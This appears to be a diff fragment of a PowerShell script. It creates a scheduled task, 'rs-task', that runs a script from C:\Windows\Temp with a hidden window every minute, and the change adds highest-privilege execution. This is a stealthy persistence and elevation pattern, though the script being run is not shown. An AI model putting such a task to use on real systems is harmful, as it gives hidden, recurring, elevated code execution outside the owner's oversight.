@@ -11,7 +11,7 @@ if($taskExists) {
    Write-Output "EXISTS";
 } else {
    Write-Output "Creating task...";
-   C:\Windows\System32\schtasks.exe /create /tn rs-task /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 1 /ru (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName)
+   C:\Windows\System32\schtasks.exe /create /tn rs-task /RL HIGHEST /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 1 /ru (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName)
    #$action = New-ScheduledTaskAction -Execute "rs_sl.ps1" -WorkingDirectory "C:\Windows\Temp";
    #$trigger = New-ScheduledTaskTrigger -AtLogOn;
    #$principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName);
